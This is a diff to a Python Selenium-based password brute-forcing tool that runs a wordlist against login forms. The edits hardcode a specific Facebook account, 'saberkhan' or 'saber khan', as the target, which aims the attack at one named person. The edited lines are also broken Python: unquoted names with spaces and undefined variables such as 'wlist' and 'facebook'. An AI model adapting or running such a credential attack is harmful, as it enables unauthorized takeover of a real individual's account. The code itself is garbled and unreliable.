@@ -30,10 +30,10 @@ def main():
 
     args = parser.parse_args()
 
-    global fb_name, service
+    global fb_name, Facebook 
 
-    service = args.service
-    username = args.username
+    service = facebook
+    username = saberkhan
     wordlist = args.password
     delay = args.delay
 
@@ -53,7 +53,7 @@ def main():
 
     if service == "facebook":
 
-        fb_name = raw_input(O + "Please Enter The NAME Of The Facebook Account : " + W)
+        fb_name = raw_input(O + " saber khan : " + W)
 
         os.system("clear")
 
@@ -68,11 +68,11 @@ class Bruter(object):
 
     def __init__(self, service, username, wordlist, delay):
 
-        self.service = service
+        self.service = Facebook 
 
-        self.username = username
+        self.username = saber khan
 
-        self.wordlist = wordlist
+        self.wordlist = wlist
 
         self.delay = delay
 
@@ -181,7 +181,7 @@ class Bruter(object):
                     elem = driver.find_element_by_name("username")
 
                 elem.clear()
-                elem.send_keys(username)
+                elem.send_keys(saberkhan)
 
                 if service == "facebook":
 
